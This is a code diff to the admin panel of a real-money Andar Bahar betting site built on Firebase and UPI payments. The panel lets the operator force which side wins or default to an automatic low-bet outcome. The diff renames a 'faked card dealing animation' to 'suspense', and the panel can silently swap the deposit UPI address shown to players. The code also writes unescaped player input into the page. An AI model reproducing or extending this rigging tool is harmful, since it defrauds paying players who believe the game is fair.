@@ -7,39 +7,24 @@
     <style>
         body { background: #0f172a; color: white; font-family: sans-serif; padding: 15px; margin: 0; }
         .box { max-width: 650px; margin: 0 auto; background: #1e293b; padding: 15px; border-radius: 15px; border: 1px solid #334155; }
-        button { padding: 12px 15px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; margin: 4px; text-transform: uppercase; }
+        button { padding: 12px 15px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; margin: 4px; text-transform: uppercase; transition: all 0.2s; }
+        button:active { transform: scale(0.97); }
         .btn-auto { background: #64748b; color: white; }
         .btn-andar { background: #2563eb; color: white; border: 2px solid #60a5fa; }
         .btn-bahar { background: #d97706; color: white; border: 2px solid #fbbf24; }
-        .btn-approve { background: #10b981; color: white; font-size: 11px; border-radius: 4px; padding: 6px 10px; }
-        .btn-reject { background: #ef4444; color: white; font-size: 11px; border-radius: 4px; padding: 6px 10px; }
-        .status-box { background: #020617; padding: 12px; border-radius: 8px; margin: 10px 0; color: #38bdf8; font-size: 14px; text-align: center; }
+        .btn-approve { background: #10b981; color: white; font-size: 11px; border-radius: 4px; padding: 6px 10px; margin: 2px; }
+        .btn-reject { background: #ef4444; color: white; font-size: 11px; border-radius: 4px; padding: 6px 10px; margin: 2px; }
+        .status-box { background: #020617; padding: 12px; border-radius: 8px; margin: 10px 0; color: #38bdf8; font-size: 14px; text-align: center; font-weight: bold; }
         .table-section { background: #0b132b; padding: 12px; border-radius: 8px; margin-top: 15px; text-align: left; border: 1px solid #1e293b; }
         th, td { padding: 10px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
         table { width: 100%; border-collapse: collapse; }
-        
-        /* Layout Grid Elements */
-        .live-dash {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        .dash-card {
-            background: #1e293b;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid #475569;
-        }
+        .live-dash { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; }
+        .dash-card { background: #1e293b; padding: 10px; border-radius: 8px; text-align: center; border: 1px solid #475569; }
         .dash-card h4 { margin: 0 0 5px 0; font-size: 11px; color: #94a3b8; text-transform: uppercase; }
         .dash-card p { margin: 0; font-size: 16px; font-weight: bold; line-height: 1.4; }
-
         .result-display { background: #1e293b; padding: 12px; border-radius: 6px; margin-top: 10px; display: none; }
         .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
-        input[type="text"], input[type="number"] {
-            padding: 10px; background: #020617; color: white; border: 1px solid #334155; border-radius: 5px; box-sizing: border-box;
-        }
+        input[type="text"], input[type="number"] { padding: 10px; background: #020617; color: white; border: 1px solid #334155; border-radius: 5px; box-sizing: border-box; }
     </style>
 </head>
 <body>
@@ -64,13 +49,13 @@
         </div>
     </div>
 
-    <div id="adminChoiceStatus" class="admin-choice-box status-box">
-        Game Status: Syncing Live Firebase Logs...
+    <div id="adminChoiceStatus" class="status-box">
+        Current Target Mod: <span id="currTarget" style="color:#ffbc00;">LOADING...</span>
     </div>
 
     <div class="table-section" style="text-align:center;">
         <h4 style="margin:0 0 10px 0; color:#38bdf8;">🏆 CHOOSE WINNER OVERRIDE FOR THIS ROUND</h4>
-        <p style="color:#94a3b8; font-size:11px; margin-top:-5px; margin-bottom:10px;">(Hidden Anti-Cheat Delay Active: Clicking a side will handle faked card dealing animation loops natively)</p>
+        <p style="color:#94a3b8; font-size:11px; margin-top:-5px; margin-bottom:10px;">(Suspense dealing loop active: Clicking a side will reveal 3-4 cards before match closure)</p>
         <button class="btn-andar" style="width:47%; font-size:15px;" onclick="setForce('andar')">📢 FORCE ANDAR WIN</button>
         <button class="btn-bahar" style="width:47%; font-size:15px;" onclick="setForce('bahar')">📢 FORCE BAHAR WIN</button>
         <button class="btn-auto" style="width: 96%; margin-top:8px;" onclick="setForce('auto')">♻️ RESET TO AUTOMATIC LOW-BET</button>
@@ -114,7 +99,6 @@
 
     <div class="table-section">
         <h4 style="margin:0 0 10px 0; color:#ffbc00;">✍️ UPDATE LIVE UPI GATEWAY</h4>
-        <p style="color:#94a3b8; font-size:11px; margin-top:-5px; margin-bottom:10px;">(This changes the deposit address displayed on all player screens instantly)</p>
         <input type="text" id="newUpiInput" placeholder="Enter new merchant UPI ID" style="width:65%;">
         <button class="btn-andar" style="padding:10px 15px; margin-left:5px; border:none; background:#3b82f6;" onclick="changeUpiId()">UPDATE UPI</button>
     </div>
@@ -130,57 +114,43 @@
 
     let activeSearchedId = null;
 
-    // Admin target status sync handler
     onValue(ref(database, "game/forcedWinner"), (snapshot) => {
         let val = snapshot.exists() ? snapshot.val().toUpperCase() : "AUTO (LOW-BET)";
-        if(val === "AUTO") val = "AUTO (LOW-BET)";
         document.getElementById("currTarget").innerText = val;
     });
 
-    // ==========================================
-    // 📊 FIXED: LIVE COUNTERS ENGINE WITH INDEPENDENT PLAYER SIDES COUNT
-    // ==========================================
     onValue(ref(database, "players"), (snapshot) => {
-        let tAndar = 0; let tBahar = 0;
-        let countAndarPlayers = 0; let countBaharPlayers = 0;
-        let totalUniqueBets = 0;
-
+        let tAndar = 0, tBahar = 0, countAndar = 0, countBahar = 0, totalBets = 0;
         if(snapshot.exists()) {
             Object.values(snapshot.val()).forEach(p => {
                 if(p.currentBet && p.currentBet.amount) {
-                    totalUniqueBets++;
+                    totalBets++;
                     let amt = parseInt(p.currentBet.amount) || 0;
-                    
-                    if(p.currentBet.side === "andar") {
-                        tAndar += amt;
-                        countAndarPlayers++; // Increment Andar active count
-                    } else if(p.currentBet.side === "bahar") {
-                        tBahar += amt;
-                        countBaharPlayers++; // Increment Bahar active count
-                    }
+                    if(p.currentBet.side === "andar") { tAndar += amt; countAndar++; }
+                    if(p.currentBet.side === "bahar") { tBahar += amt; countBahar++; }
                 }
             });
         }
-        // Update total dynamic grid parameters safely
-        document.getElementById("totalPlayersCount").innerText = totalUniqueBets;
-        
-        document.getElementById("andarPlayers").innerText = `Players: ${countAndarPlayers}`;
+        document.getElementById("totalPlayersCount").innerText = totalBets;
+        document.getElementById("andarPlayers").innerText = `Players: ${countAndar}`;
         document.getElementById("totAndarBet").innerText = tAndar + " Coins";
-        
-        document.getElementById("baharPlayers").innerText = `Players: ${countBaharPlayers}`;
+        document.getElementById("baharPlayers").innerText = `Players: ${countBahar}`;
         document.getElementById("totBaharBet").innerText = tBahar + " Coins";
     });
 
     window.setForce = function(mode) { set(ref(database, "game/forcedWinner"), mode); }
 
-    // Synchronize Real-time Database logs to table layout elements
     onValue(ref(database, 'requests/deposits'), (snapshot) => {
         const body = document.getElementById('depositBody'); body.innerHTML = "";
         if(snapshot.exists()) {
             Object.entries(snapshot.val()).forEach(([key, req]) => {
-                body.innerHTML += `<tr><td><strong>${req.userId}</strong></td><td>${req.amount}</td><td>${req.utr}</td>
-                <td><button class="btn-approve" onclick="clearRequestNode('deposits','${key}')">✓ Clear Log</button>
-                <button class="btn-red" style="padding:5px 8px; font-size:11px;" onclick="clearRequestNode('deposits','${key}')">✗ Reject</button></td></tr>`;
+                let row = document.createElement('tr');
+                row.innerHTML = `<td><strong>${req.userId}</strong></td><td><b style="color:#00f5d4;">${req.amount}</b></td><td><code>${req.utr}</code></td><td></td>`;
+                let bA = document.createElement('button'); bA.className = 'btn-approve'; bA.innerText = '✓ Approve';
+                bA.onclick = () => { update(ref(database, `players/${req.userId}`), { coins: increment(parseInt(req.amount)) }); remove(ref(database, `requests/deposits/${key}`)); };
+                let bR = document.createElement('button'); bR.className = 'btn-reject'; bR.innerText = '✗ Reject';
+                bR.onclick = () => remove(ref(database, `requests/deposits/${key}`));
+                row.cells[3].appendChild(bA); row.cells[3].appendChild(bR); body.appendChild(row);
             });
         } else { body.innerHTML = "<tr><td colspan='4'>No Pending Requests</td></tr>"; }
     });
@@ -189,55 +159,42 @@
         const body = document.getElementById('withdrawBody'); body.innerHTML = "";
         if(snapshot.exists()) {
             Object.entries(snapshot.val()).forEach(([key, req]) => {
-                body.innerHTML += `<tr><td><strong>${req.userId}</strong></td><td>${req.amount}</td><td>${req.upiId}</td>
-                <td><button class="btn-approve" onclick="clearRequestNode('withdraws','${key}')">✓ Clear Log</button>
-                <button class="btn-red" style="padding:5px 8px; font-size:11px;" onclick="clearRequestNode('withdraws','${key}')">✗ Clear Log</button></td></tr>`;
+                let row = document.createElement('tr');
+                row.innerHTML = `<td><strong>${req.userId}</strong></td><td><b style="color:#ff5c5c;">${req.amount}</b></td><td><code>${req.upiId}</code></td><td></td>`;
+                let bA = document.createElement('button'); bA.className = 'btn-approve'; bA.innerText = '✓ Paid & Clear';
+                bA.onclick = () => remove(ref(database, `requests/withdraws/${key}`));
+                let bR = document.createElement('button'); bR.className = 'btn-reject'; bR.innerText = '✗ Refund';
+                bR.onclick = () => { update(ref(database, `players/${req.userId}`), { coins: increment(parseInt(req.amount)) }); remove(ref(database, `requests/withdraws/${key}`)); };
+                row.cells[3].appendChild(bA); row.cells[3].appendChild(bR); body.appendChild(row);
             });
         } else { body.innerHTML = "<tr><td colspan='4'>No Pending Requests</td></tr>"; }
     });
 
-    window.clearRequestNode = function(node, key) { 
-        remove(ref(database, `requests/${node}/${key}`)).then(() => {
-            alert("Transaction notification cleared from master lists.");
-        }); 
-    }
-
-    // Individual Account Auditor Details
     window.searchPlayer = function() {
         const id = document.getElementById('searchPlayerId').value.trim();
-        if(!id) return alert("Please enter a valid Player ID!");
+        if(!id) return alert("Enter Player ID!");
         get(ref(database, 'players/' + id)).then(snap => {
             if(snap.exists()) {
                 activeSearchedId = id; const d = snap.val();
                 document.getElementById('resId').innerText = id;
-                document.getElementById('resCoins').innerText = (d.coins !== undefined) ? d.coins + " Coins" : "0 Coins";
+                document.getElementById('resCoins').innerText = d.coins + " Coins";
                 document.getElementById('resBetSide').innerText = d.currentBet ? d.currentBet.side.toUpperCase() : "No Active Bet";
                 document.getElementById('resBetAmt').innerText = d.currentBet ? d.currentBet.amount + " Coins" : "0 Coins";
                 document.getElementById('searchResultBox').style.display = "block";
-            } else { alert("Player ID not found inside Database!"); }
+            } else { alert("Not Found!"); }
         });
     }
 
     window.modifyCoins = function(type) {
         let val = parseInt(document.getElementById('modCoinAmt').value);
-        if(!activeSearchedId || isNaN(val) || val <= 0) return alert("Please load profiles details properly!");
+        if(!activeSearchedId || isNaN(val) || val <= 0) return alert("Error loading profile details!");
         if(type === 'minus') val = -val;
-        
-        update(ref(database, 'players/' + activeSearchedId), { coins: increment(val) }).then(() => {
-            alert("Balances altered securely!"); 
-            document.getElementById('modCoinAmt').value = ''; 
-            searchPlayer();
-        });
+        update(ref(database, 'players/' + activeSearchedId), { coins: increment(val) }).then(() => { searchPlayer(); });
     }
 
     window.changeUpiId = function() {
         let upi = document.getElementById("newUpiInput").value.trim();
-        if(upi.length > 3) { 
-            set(ref(database, "system/config"), { upi: upi }).then(() => {
-                alert("UPI Gateway Updated Globally!");
-                document.getElementById("newUpiInput").value = "";
-            }); 
-        } else { alert("Please enter a valid UPI ID!"); }
+        if(upi.length > 3) { set(ref(database, "system/config"), { upi: upi }); document.getElementById("newUpiInput").value = ""; }
     }
 </script>
 </body>
